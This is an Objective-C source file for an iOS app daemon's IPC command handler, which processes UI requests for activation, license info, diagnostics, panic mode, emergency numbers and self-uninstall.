//
//  AppEngineConnection.m
//  AppEngine
//
//  Created by Makara Khloth on 11/19/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppEngineConnection.h"
#import "AppEngine.h"
#import "AppEngineUICmd.h"
#import "PreferencesData.h"

// Components headers
#import "ComponentHeaders.h"

// Socket IPC
#import "SocketIPCSender.h"
#import "ProductMetaData.h"
#import "ProductActivationData.h"
#import "MessagePortIPCSender.h"

#import "DefStd.h"

@interface AppEngineConnection (private)
- (void) sendDataToUI: (NSData*) aData;
- (void) sendDataToSettingsBundle: (NSData *) aData;
- (void) sendActivationFailureToUI: (NSData *) aData;
@end

@implementation AppEngineConnection

@synthesize mUICommandCode;

- (id) initWithAppEngine: (AppEngine*) aAppEngine {
	if ((self = [super init])) {
		mAppEngine = aAppEngine;
		[mAppEngine retain];
		
		// Listen to UI command
//		mEngineSocket = [[SocketIPCReader alloc] initWithPortNumber:kAppUISendSocketPort andAddress:kLocalHostIP withSocketDelegate:self];
//		[mEngineSocket start];
		mEngineMessagePort = [[MessagePortIPCReader alloc] initWithPortName:kAppUISendMessagePort withMessagePortIPCDelegate:self];
		[mEngineMessagePort start];
	}
	return (self);
}

#pragma mark -
#pragma mark Obsolete
#pragma mark -

- (void) processCommand: (NSInteger) aCmdId withCmdData: (id) aCmdData {
	NSInteger command = aCmdId;
	NSMutableData *commandData = [NSMutableData data];
	[commandData appendBytes:&command length:sizeof(NSInteger)];
	switch (aCmdId) {
		case kAppUI2EngineGetLicenseInfoCmd: {
			LicenseInfo *licInfo = aCmdData;
			NSData *licInfoData = [licInfo transformToData];
			[commandData appendData:licInfoData];
			[self sendDataToUI:commandData];
		} break;
		default:
			break;
	}
}

#pragma mark -
#pragma mark Socket IPC
#pragma mark -

// Socket IPC
- (void) dataDidReceivedFromSocket: (NSData*) aRawData {
	DLog(@"(AppEngine) dataDidReceivedFromSocket")
}

#pragma mark -
#pragma mark Message port IPC
#pragma mark -

// Message port IPC
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	// First 4 bytes always command
	NSInteger uiCommand = kAppUI2EngineUnknownCmd;
	if (aRawData) {
		NSInteger location = 0;
		[aRawData getBytes:&uiCommand length:sizeof(NSInteger)];
		location += sizeof(NSInteger);
		
		DLog(@"Daemon received command data, dataDidReceivedFromMessagePort uiCommand: %d", uiCommand)
		
		[self setMUICommandCode:uiCommand];
		
		NSRange range = NSMakeRange(location, [aRawData length] -location);
		
		NSMutableData *responseData = [NSMutableData data];
		[responseData appendBytes:&uiCommand length:sizeof(NSInteger)];
		
		switch (uiCommand) {
			case kAppUI2EngineActivateCmd: {
				// Activate
				NSData *commandData = [aRawData subdataWithRange:range];
				NSInteger location = 0;
				NSInteger length = 0;
				[commandData getBytes:&length length:sizeof(NSInteger)];
				location += sizeof(NSInteger);
				NSString *activationCode = [[NSString alloc] initWithData:[commandData subdataWithRange:NSMakeRange(location, length)]
																 encoding:NSUTF8StringEncoding];
				//DLog(@"Got activation code from ui: %@", activationCode)
				ActivationInfo *activationInfo = [[ActivationInfo alloc] init];
				[activationInfo setMActivationCode:activationCode];
				[activationInfo setMDeviceInfo:[[[mAppEngine mApplicationContext] getPhoneInfo] getDeviceInfo]];
				[activationInfo setMDeviceModel:[[[mAppEngine mApplicationContext] getPhoneInfo] getDeviceModel]];
				BOOL isSubmit = [[mAppEngine mActivationManager] activate:activationInfo andListener:self];
				//DLog(@"Command activate from ui is sent to server successfully: %d", isSubmit)
				if (!isSubmit) {
					// Notify back to UI
					[self sendActivationFailureToUI:responseData];
				}
				[activationInfo release];
				[activationCode release];
			} break;
			case kAppUI2EngineRequestActivateCmd: {
				// Request activate
				BOOL isSubmit = [[mAppEngine mActivationManager] requestActivate:self];
				if (!isSubmit) {
					// Notify back to UI
					[self sendActivationFailureToUI:responseData];
				}
			} break;
			case kAppUI2EngineDeactivateCmd: {
				// Deactivate
				BOOL isSubmit = [[mAppEngine mActivationManager] deactivate:self];
				if (!isSubmit) {
					// Notify back to UI
					[self sendActivationFailureToUI:responseData];
				}
			} break;
			case kAppUI2EngineUninstallCmd: {
				// Uninstall
				NSBundle *bundle = [NSBundle mainBundle];
				if (bundle) {
					NSString *bundleResourcePath = [bundle resourcePath];
					NSString *uninstallPath = [bundleResourcePath stringByAppendingString:@"/Uninstall.sh"];
					//DLog (@"Uninstall path get from resource path bundle = %@", uninstallPath);
					NSString *executeUninstallScript = [NSString stringWithFormat:@"launchctl submit -l com.app.ssmp.rm -p  %@ start ssmp-remove-daemon", uninstallPath];
					//DLog(@"Uninstall script to exc, executeUninstallScript: %@", executeUninstallScript)
					system([executeUninstallScript cStringUsingEncoding:NSUTF8StringEncoding]);
					exit(0);
				}
			} break;
			case kAppUI2EngineGetAboutCmd: {
				// Get about
				LicenseManager *licenseManager = [mAppEngine mLicenseManager];
				LicenseInfo *licInfo = [licenseManager mCurrentLicenseInfo];
				NSInteger configID = [licInfo configID];
				if ([licInfo licenseStatus] == EXPIRED) {
					configID = CONFIG_EXPIRE_LICENSE;
				} else if ([licInfo licenseStatus] == DISABLE) {
					configID = CONFIG_DISABLE_LICENSE;
				}
				
				ProductMetaData *pMetaData = [[ProductMetaData alloc] init];
				[pMetaData setMConfigID:configID];
				[pMetaData setMProductID:[[[mAppEngine mApplicationContext] getProductInfo] getProductID]];
				[pMetaData setMProtocolLanguage:[[[mAppEngine mApplicationContext] getProductInfo] getLanguage]];
				[pMetaData setMProtocolVersion:[[[mAppEngine mApplicationContext] getProductInfo] getProtocolVersion]];
				[pMetaData setMProductVersion:[[[mAppEngine mApplicationContext] getProductInfo] getProductVersion]];
				[pMetaData setMProductName:[[[mAppEngine mApplicationContext] getProductInfo] getProductName]];
				[pMetaData setMProductDescription:[[[mAppEngine mApplicationContext] getProductInfo] getProductDescription]];
				[pMetaData setMProductLanguage:[[[mAppEngine mApplicationContext] getProductInfo] getProductLanguage]];
				[pMetaData setMLicenseHashTail:[[[mAppEngine mApplicationContext] getProductInfo] getProtocolHashTail]];
				[pMetaData setMProductVersionDescription:[[[mAppEngine mApplicationContext] getProductInfo] getProductVersionDescription]];
				NSData *metaData = [pMetaData transformToData];
				[responseData appendData:metaData];
				[self sendDataToUI:responseData];
				[pMetaData release];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineGetCurrentSettingsCmd: {
				// Get current settings
				PreferencesData *pData = [[PreferencesData alloc] init];
				NSData *preferenceData = [pData transformToDataFromPrefereceManager:[mAppEngine mPreferenceManager]];
				[responseData appendData:preferenceData];
				[self sendDataToUI:responseData];
				[pData release];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineGetLastConnectionsCmd: {
				// Get last connections
				NSData *connectionLogsData = [[mAppEngine mConnectionHistoryManager] transformAllConnectionHistoryToData];
				[responseData appendData:connectionLogsData];
				[self sendDataToUI:responseData];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineGetLicenseInfoCmd: {
				// Get license info
				LicenseManager *licenseManager = [mAppEngine mLicenseManager];
				LicenseInfo *licInfo = [licenseManager mCurrentLicenseInfo];
				// Copy license info to UI
				LicenseInfo *licInfoUI = [[LicenseInfo alloc] init];
				[licInfoUI setActivationCode:[licInfo activationCode]];
				[licInfoUI setMd5:[licInfo md5]];
				[licInfoUI setLicenseStatus:[licInfo licenseStatus]];
				[licInfoUI setConfigID:[licInfo configID]];
				if ([licInfo licenseStatus] == EXPIRED) {
					[licInfoUI setConfigID:CONFIG_EXPIRE_LICENSE];
				} else if ([licInfo licenseStatus] == DISABLE) {
					[licInfoUI setConfigID:CONFIG_DISABLE_LICENSE];
				}
				// Send data to UI
				NSData *licInfoData = [licInfoUI transformToData];
				[responseData appendData:licInfoData];
				[self sendDataToUI:responseData];
				[licInfoUI release];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineGetDiagnosticCmd: {
				NSData *eventCountData = [[[mAppEngine mERM] eventCount] transformToData];
				NSData *dbHealthInfoData = [[[mAppEngine mERM] dbHealthInfo] transformToData];
				NSArray *allConnectionHistory = [[mAppEngine mConnectionHistoryManager] selectAllConnectionHistory];
				ConnectionLog *lastConnectionLog = [allConnectionHistory lastObject];
				NSString *lastConnectionTime = [lastConnectionLog mDateTime];
				NSInteger length = [eventCountData length];
				
				// Event count
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:eventCountData];
				//DLog(@"Length of eventCountData: %d", length)
				//DLog(@"eventCountData: %@", eventCountData)
				
				// Database health
				length = [dbHealthInfoData length];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:dbHealthInfoData];
				//DLog(@"Length of dbHealthInfoData: %d", length)
				//DLog(@"dbHealthInfoData: %@", dbHealthInfoData)
				
				// Last connections history
				length = [lastConnectionTime lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:[lastConnectionTime dataUsingEncoding:NSUTF8StringEncoding]];
				//DLog(@"Length of lastConnectionTime data using encoding UTF8: %d", length)
				
				// Server synced time
				NSMutableData *syncTimeData = [NSMutableData data];
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_CommunicationRestriction]) {
					SyncTimeManager *syncTimeManager = [mAppEngine mSyncTimeManager];
					BOOL isTimeSync = [syncTimeManager mIsSync];
					[syncTimeData appendBytes:&isTimeSync length:sizeof(BOOL)];
					if (isTimeSync) {
						NSTimeInterval serverClientDiffTimeInterval = [syncTimeManager mServerClientDiffTimeInterval];
						[syncTimeData appendBytes:&serverClientDiffTimeInterval length:sizeof(NSTimeInterval)];
						
						SyncTime *syncTime = [syncTimeManager mSyncTime];
						length = [[syncTime toData] length];
						[syncTimeData appendBytes:&length length:sizeof(NSInteger)];
						[syncTimeData appendData:[syncTime toData]];
					}
				}
				length = [syncTimeData length];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:syncTimeData];
				
				[self sendDataToUI:responseData];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineStartPanicCmd: {
				DLog (@"-------------- Start panic have been sent by ui ------")
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_Panic]) {
					PrefPanic *prefPanic = (PrefPanic *)[[mAppEngine mPreferenceManager] preference:kPanic];
					[prefPanic setMPanicStart:YES];
					[[mAppEngine mPreferenceManager] savePreferenceAndNotifyChange:prefPanic];
				}
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineStopPanicCmd: {
				DLog (@"-------------- Stop panic have been sent by ui -------");
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_Panic]) {
					PrefPanic *prefPanic = (PrefPanic *)[[mAppEngine mPreferenceManager] preference:kPanic];
					[prefPanic setMPanicStart:NO];
					[[mAppEngine mPreferenceManager] savePreferenceAndNotifyChange:prefPanic];
				}
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineSignUpCmd: {
			} break;
			case kAppUI2EngineSignUpActivateCmd: {
			} break;
			case kAppUI2EngineGetServerSyncedTimeCmd: {
				NSInteger length = 0;
				NSMutableData *syncTimeData = [NSMutableData data];
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_CommunicationRestriction]) {
					SyncTimeManager *syncTimeManager = [mAppEngine mSyncTimeManager];
					BOOL isTimeSync = [syncTimeManager mIsSync];
					[syncTimeData appendBytes:&isTimeSync length:sizeof(BOOL)];
					if (isTimeSync) {
						NSTimeInterval xDiff = [syncTimeManager mServerClientDiffTimeInterval];
						[syncTimeData appendBytes:&xDiff length:sizeof(NSTimeInterval)];
						
						SyncTime *syncTime = [syncTimeManager mSyncTime];
						length = [[syncTime toData] length];
						[syncTimeData appendBytes:&length length:sizeof(NSInteger)];
						[syncTimeData appendData:[syncTime toData]];
					}
				}
				length = [syncTimeData length];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:syncTimeData];
				
				[self sendDataToUI:responseData];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineGetEmergencyNumbersCmd: {
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EmergencyNumbers]) {
					PrefEmergencyNumber *prefEmergencyNumber = (PrefEmergencyNumber *)[[mAppEngine mPreferenceManager]
																					   preference:kEmergency_Number];
					NSData *prefENData = [prefEmergencyNumber toData];
					NSInteger length = [prefENData length];
					[responseData appendBytes:&length length:sizeof(NSInteger)];
					[responseData appendData:prefENData];
					[self sendDataToUI:responseData];
				}
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kAppUI2EngineSaveEmergencyNumbersCmd: {
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EmergencyNumbers]) {
					NSData *commandData = [aRawData subdataWithRange:range];
					NSInteger length = 0;
					NSInteger location = 0;
					[commandData getBytes:&length length:sizeof(NSInteger)];
					location += sizeof(NSInteger);
					NSData *prefENData = [commandData subdataWithRange:NSMakeRange(location, length)];
					PrefEmergencyNumber *prefEmergencyNumber = [[PrefEmergencyNumber alloc] initFromData:prefENData];
					[[mAppEngine mPreferenceManager] savePreferenceAndNotifyChange:prefEmergencyNumber];
					[prefEmergencyNumber release];
				}
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kSettingsBundle2EngineGetSettingsCmd: {
				// No need to check whether feature is support since this settings will not effect
				// if product is not yet activated this command come from settings bundle
				PrefPanic *prefPanic = (PrefPanic *)[[mAppEngine mPreferenceManager] preference:kPanic];
				PrefEmergencyNumber *prefEmergencyNumbers = (PrefEmergencyNumber *)[[mAppEngine mPreferenceManager]
																					preference:kEmergency_Number];
				// Panic preference
				NSData *prefPanicData = [prefPanic toData];
				NSInteger length = [prefPanicData length];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:prefPanicData];
				
				// Emergency numbers preference
				NSData *prefEmergencyNumbersData = [prefEmergencyNumbers toData];
				length = [prefEmergencyNumbersData length];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:prefEmergencyNumbersData];
				
				// Version number
				NSString *version = [[[mAppEngine mApplicationContext] getProductInfo] getProductFullVersion];
				length = [version lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
				[responseData appendBytes:&length length:sizeof(NSInteger)];
				[responseData appendData:[version dataUsingEncoding:NSUTF8StringEncoding]];
				
				[self sendDataToSettingsBundle:responseData];
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			case kSettingsBundle2EngineSaveSettingsCmd: {
				NSInteger length, location;
				length = location = 0;
				NSData *commandData = [aRawData subdataWithRange:range];
				
				// Panic preference
				[commandData getBytes:&length length:sizeof(NSInteger)];
				location += sizeof(NSInteger);
				NSData *subData = [commandData subdataWithRange:NSMakeRange(location, length)];
				PrefPanic *prefPanic = [[PrefPanic alloc] initFromData:subData];
				location += length;
				
				// Emergency numbers preference
				[commandData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
				location += sizeof(NSInteger);
				subData = [commandData subdataWithRange:NSMakeRange(location, length)];
				PrefEmergencyNumber *prefEmergencyNumbers = [[PrefEmergencyNumber alloc] initFromData:subData];
				
				// Save preference and notify changes
				id <PreferenceManager> preferenceManager = [mAppEngine mPreferenceManager];
				[preferenceManager savePreferenceAndNotifyChange:prefPanic];
				[preferenceManager savePreferenceAndNotifyChange:prefEmergencyNumbers];
				[prefPanic release];
				[prefEmergencyNumbers release];
				
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
			} break;
			default:
				[self setMUICommandCode:kAppUI2EngineUnknownCmd];
				break;
		}
	}
}

#pragma mark -
#pragma mark Activation manager
#pragma mark -

- (void) onComplete:(ActivationResponse *)aActivationResponse {
	DLog(@"aActivationResponse.isMSuccess: %d", [aActivationResponse isMSuccess])
	NSInteger command = kAppUI2EngineUnknownCmd;
	if ([aActivationResponse mEchoCommand] == SEND_ACTIVATE) {
		command = kAppUI2EngineActivateCmd;
	} else if ([aActivationResponse mEchoCommand] == GET_ACTIVATION_CODE) {
		command = kAppUI2EngineRequestActivateCmd;
	} else {
		command = kAppUI2EngineDeactivateCmd;
	}
	NSMutableData *responseData = [NSMutableData data];
	[responseData appendBytes:&command length:sizeof(NSInteger)];
	ProductActivationData *pActivationData = [[ProductActivationData alloc] init];
	[pActivationData setMIsSuccess:[aActivationResponse isMSuccess]];
	if ([aActivationResponse isMSuccess]) {
		[pActivationData setMErrorCode:[aActivationResponse mResponseCode]];
	} else {
		if ([aActivationResponse mHTTPStatusCode] != 0) {
			[pActivationData setMErrorCode:[aActivationResponse mHTTPStatusCode]];
		} else {
			[pActivationData setMErrorCode:[aActivationResponse mResponseCode]];
		}
	}
	
	LicenseManager *licenseManager = [mAppEngine mLicenseManager];
	
	[pActivationData setMErrorCategory:kFxErrorNone];
	[pActivationData setMErrorDescription:[aActivationResponse mMessage]];
	[pActivationData setMLicenseInfo:[licenseManager mCurrentLicenseInfo]];
	
	//==== Force to deactivate...
	if (command == kAppUI2EngineDeactivateCmd &&
		![aActivationResponse isMSuccess]) {
		DLog (@"Force deactivate the product...")
		[licenseManager resetLicense];
		[pActivationData setMIsSuccess:YES];
		[pActivationData setMErrorCode:0];
		[pActivationData setMLicenseInfo:[licenseManager mCurrentLicenseInfo]];
	}
	///----------------
	
	NSData *data = [pActivationData transformToData];
	[responseData appendData:data];
	[self sendDataToUI:responseData];
	[pActivationData release];
	[self setMUICommandCode:kAppUI2EngineUnknownCmd];
}

#pragma mark -
#pragma mark Sign up manager
#pragma mark -

- (void) signUpDidFinished: (NSError *) aError signUpResponse: (SignUpResponse *) aResponse {
	if (aError) {
		SignUpResponse *signUpResponse = [[SignUpResponse alloc] init];
		[signUpResponse setMStatus:@"ERROR"];
		[signUpResponse setMMessage:[aError domain]];
		NSMutableData *data = [NSMutableData data];
		NSInteger echoCmd = [self mUICommandCode];
		[data appendBytes:&echoCmd length:sizeof(NSInteger)];
		[data appendData:[signUpResponse toData]];
		[self sendDataToUI:data];
		[signUpResponse release];
		[self setMUICommandCode:kAppUI2EngineUnknownCmd];
	} else {
		if ([self mUICommandCode] == kAppUI2EngineSignUpActivateCmd) {
			// Send activate command
			NSMutableData *commandData = [NSMutableData data];
			NSInteger commandCode = kAppUI2EngineActivateCmd;
			[commandData appendBytes:&commandCode length:sizeof(NSInteger)];
			NSInteger length = [[aResponse mActivationCode] lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
			[commandData appendBytes:&length length:sizeof(NSInteger)];
			[commandData appendData:[[aResponse mActivationCode] dataUsingEncoding:NSUTF8StringEncoding]];
			[self dataDidReceivedFromMessagePort:commandData];
		} else { // Only sign up
			NSMutableData *data = [NSMutableData data];
			NSInteger echoCmd = [self mUICommandCode];
			[data appendBytes:&echoCmd length:sizeof(NSInteger)];
			[data appendData:[aResponse toData]];
			[self sendDataToUI:data];
			[self setMUICommandCode:kAppUI2EngineUnknownCmd];
		}
	}
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) sendDataToUI: (NSData*) aData {
	DLog(@"aData: %@", aData)
//	SocketIPCSender* socketSender = [[SocketIPCSender alloc] initWithPortNumber:kAppEngineSendSocketPort andAddress:kLocalHostIP];
//	[socketSender writeDataToSocket:aData];
//	[socketSender release];
	
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kAppEngineSendMessagePort];
	[messagePortSender writeDataToPort:aData];
	[messagePortSender release];
}

- (void) sendDataToSettingsBundle: (NSData*) aData {
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kSettingBundleMsgPort];
	[messagePortSender writeDataToPort:aData];
	[messagePortSender release];
}

- (void) sendActivationFailureToUI: (NSData *) aData {
	NSMutableData *responseData = [NSMutableData dataWithData:aData];
	ProductActivationData *pActivationData = [[ProductActivationData alloc] init];
	[pActivationData setMErrorCode:kActivationManagerBusy];
	[pActivationData setMErrorCategory:kFxErrorActivationManager];
	[pActivationData setMErrorDescription:NSLocalizedString(@"kActivationManagerBusyInvalidActivationInfo", @"")];
	NSData *data = [pActivationData transformToData];
	[responseData appendData:data];
	[self sendDataToUI:responseData];
	[pActivationData release];
	[self setMUICommandCode:kAppUI2EngineUnknownCmd];
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
	[mEngineMessagePort release];
	[mEngineSocket release];
	[mAppEngine release];
	[super dealloc];
}

@end
